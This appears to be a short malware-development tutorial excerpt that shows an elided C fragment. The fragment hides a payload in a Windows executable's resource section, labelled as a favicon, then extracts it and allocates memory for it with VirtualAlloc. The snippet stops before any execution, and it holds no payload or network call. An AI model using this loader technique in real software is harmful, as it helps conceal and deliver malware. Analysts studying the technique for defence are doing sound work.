# Storing Payloads in .rsc

This method of storing the payload revolves around the use of a byte string
that resides inside of the resources section of the executable itself.
```
#include "resources.h"
(...)

int main(void)
{
    (...)

    // Extract payload from resources section
    res = FindResourceA(NULL, MAKEINTRESOURCE(FAVICON_ICO), RT_RCDATA);
    HGLOBAL hRes = LoadResource(NULL, res);

    // Create payload
    unsigned char* payload = (unsigned char *)LockResource(hRes);
    size_t payload_size = SizeofResource(NULL, res);

    // Allocate a memory buffer for payload
    exec_mem = VirtualAlloc(NULL, payload_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    (...)
```
